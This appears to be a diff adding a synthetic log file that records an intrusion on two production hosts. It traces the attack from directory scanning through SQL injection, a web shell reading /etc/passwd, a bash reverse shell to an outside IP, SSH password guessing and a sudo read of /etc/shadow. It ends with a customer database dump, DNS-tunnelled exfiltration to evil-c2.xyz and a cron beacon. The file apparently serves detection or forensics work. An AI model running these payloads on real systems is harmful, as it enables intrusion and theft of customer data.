@@ -1,0 +1,66 @@
+Jun 20 13:58:01 web-prod-02 CRON[4012]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 20 13:58:01 web-prod-02 CRON[4012]: pam_unix(cron:session): session closed for user root
+203.0.113.66 - - [20/Jun/2026:14:00:03 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:00:14 +0000] "GET /admin HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:14 +0000] "GET /backup HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:15 +0000] "GET /.git HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:15 +0000] "GET /wp-admin HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:16 +0000] "GET /config.php.bak HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:16 +0000] "GET /phpmyadmin HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:17 +0000] "GET /uploads HTTP/1.1" 403 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:17 +0000] "GET /api HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:18 +0000] "GET /test HTTP/1.1" 404 491 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Jun/2026:14:00:18 +0000] "GET /old HTTP/1.1" 404 491 "-" "gobuster/3.6"
+Jun 20 14:00:20 web-prod-02 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.66 DST=10.0.2.10 PROTO=TCP SPT=44100 DPT=8080
+Jun 20 14:00:21 web-prod-02 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.66 DST=10.0.2.10 PROTO=TCP SPT=44101 DPT=8443
+Jun 20 14:00:22 web-prod-02 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.66 DST=10.0.2.10 PROTO=TCP SPT=44102 DPT=3306
+203.0.113.66 - - [20/Jun/2026:14:02:31 +0000] "GET /products?id=1 HTTP/1.1" 200 1820 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:02:45 +0000] "GET /products?id=1' HTTP/1.1" 500 612 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:02:58 +0000] "GET /products?id=1+OR+1=1 HTTP/1.1" 200 28110 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:03:12 +0000] "GET /products?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1" 200 31200 "-" "Mozilla/5.0"
+Jun 20 14:03:12 web-prod-02 app[2210]: ERROR sql: syntax error near 'UNION SELECT username,password FROM users'
+203.0.113.66 - - [20/Jun/2026:14:03:30 +0000] "GET /products?id=1+UNION+SELECT+table_name,1+FROM+information_schema.tables HTTP/1.1" 200 40233 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:05:02 +0000] "POST /uploads/upload.php HTTP/1.1" 200 89 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:05:18 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 34 "-" "Mozilla/5.0"
+Jun 20 14:05:18 web-prod-02 app[2210]: INFO shell.php executed: whoami (uid=www-data)
+203.0.113.66 - - [20/Jun/2026:14:05:33 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 71 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:05:51 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1622 "-" "Mozilla/5.0"
+203.0.113.66 - - [20/Jun/2026:14:06:20 +0000] "GET /uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 142 "-" "Mozilla/5.0"
+Jun 20 14:07:44 web-prod-02 systemd[1]: Started Session c12 of user www-data.
+Jun 20 14:07:45 web-prod-02 bash[3120]: www-data executed: bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
+Jun 20 14:07:46 web-prod-02 kernel: outbound connection ESTABLISHED SRC=10.0.2.10 DST=203.0.113.66 DPT=4444
+Jun 20 14:08:10 web-prod-02 sshd[3301]: Connection from 10.0.2.10 port 51200 to internal host db-prod-01
+Jun 20 14:10:01 db-prod-01 sshd[8801]: Failed password for root from 10.0.2.10 port 51210 ssh2
+Jun 20 14:10:03 db-prod-01 sshd[8803]: Failed password for root from 10.0.2.10 port 51212 ssh2
+Jun 20 14:10:05 db-prod-01 sshd[8805]: Failed password for admin from 10.0.2.10 port 51214 ssh2
+Jun 20 14:10:07 db-prod-01 sshd[8807]: Failed password for admin from 10.0.2.10 port 51216 ssh2
+Jun 20 14:10:09 db-prod-01 sshd[8809]: Failed password for postgres from 10.0.2.10 port 51218 ssh2
+Jun 20 14:10:11 db-prod-01 sshd[8811]: Failed password for postgres from 10.0.2.10 port 51220 ssh2
+Jun 20 14:10:13 db-prod-01 sshd[8813]: Invalid user oracle from 10.0.2.10 port 51222
+Jun 20 14:10:13 db-prod-01 sshd[8813]: Failed password for invalid user oracle from 10.0.2.10 port 51222 ssh2
+Jun 20 14:10:15 db-prod-01 sshd[8815]: Invalid user dbadmin from 10.0.2.10 port 51224
+Jun 20 14:10:15 db-prod-01 sshd[8815]: Failed password for invalid user dbadmin from 10.0.2.10 port 51224 ssh2
+Jun 20 14:10:17 db-prod-01 sshd[8817]: Failed password for postgres from 10.0.2.10 port 51226 ssh2
+Jun 20 14:10:19 db-prod-01 sshd[8819]: Failed password for postgres from 10.0.2.10 port 51228 ssh2
+Jun 20 14:10:21 db-prod-01 sshd[8821]: Failed password for postgres from 10.0.2.10 port 51230 ssh2
+Jun 20 14:10:23 db-prod-01 sshd[8823]: Failed password for admin from 10.0.2.10 port 51232 ssh2
+Jun 20 14:10:25 db-prod-01 sshd[8825]: Failed password for admin from 10.0.2.10 port 51234 ssh2
+Jun 20 14:10:27 db-prod-01 sshd[8827]: Failed password for postgres from 10.0.2.10 port 51236 ssh2
+Jun 20 14:10:31 db-prod-01 sshd[8831]: Accepted password for postgres from 10.0.2.10 port 51240 ssh2
+Jun 20 14:10:31 db-prod-01 sshd[8831]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Jun 20 14:11:02 db-prod-01 sudo:  postgres : TTY=pts/1 ; PWD=/var/lib/postgresql ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jun 20 14:11:20 db-prod-01 sudo:  postgres : TTY=pts/1 ; PWD=/var/lib/postgresql ; USER=root ; COMMAND=/usr/bin/pg_dump -Fc customers
+20-Jun-2026 14:12:01.337 client 10.0.2.20#41001: query: aGVsbG8td29ybGQtZXhmaWw.data.evil-c2.xyz IN TXT +
+20-Jun-2026 14:12:01.901 client 10.0.2.20#41002: query: Y3VzdG9tZXItcmVjb3Jkcy1iYXRjaA.data.evil-c2.xyz IN TXT +
+20-Jun-2026 14:12:02.455 client 10.0.2.20#41003: query: c3NuLWNhcmQtbnVtYmVycy1kdW1w.data.evil-c2.xyz IN TXT +
+20-Jun-2026 14:12:03.012 client 10.0.2.20#41004: query: ZW1haWwtYWRkcmVzcy1saXN0LTAx.data.evil-c2.xyz IN TXT +
+20-Jun-2026 14:12:03.566 client 10.0.2.20#41005: query: cGFzc3dvcmQtaGFzaGVzLWFsbA.data.evil-c2.xyz IN TXT +
+20-Jun-2026 14:12:04.120 client 10.0.2.20#41006: query: ZXhmaWwtY29tcGxldGUtc2lnbmFs.data.evil-c2.xyz IN TXT +
+Jun 20 14:13:45 db-prod-01 crontab[9100]: (postgres) BEGIN EDIT (postgres)
+Jun 20 14:13:52 db-prod-01 crontab[9100]: (postgres) REPLACE (postgres)
+Jun 20 14:13:52 db-prod-01 CRON[9101]: (postgres) RELOAD (crontabs)
+Jun 20 14:14:01 db-prod-01 CRON[9110]: (postgres) CMD (/tmp/.beacon.sh)
+Jun 20 14:20:01 db-prod-01 CRON[9300]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 20 14:20:01 db-prod-01 CRON[9300]: pam_unix(cron:session): session closed for user root
+Jun 20 14:25:01 web-prod-02 CRON[4500]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 20 14:25:01 web-prod-02 CRON[4500]: pam_unix(cron:session): session closed for user root
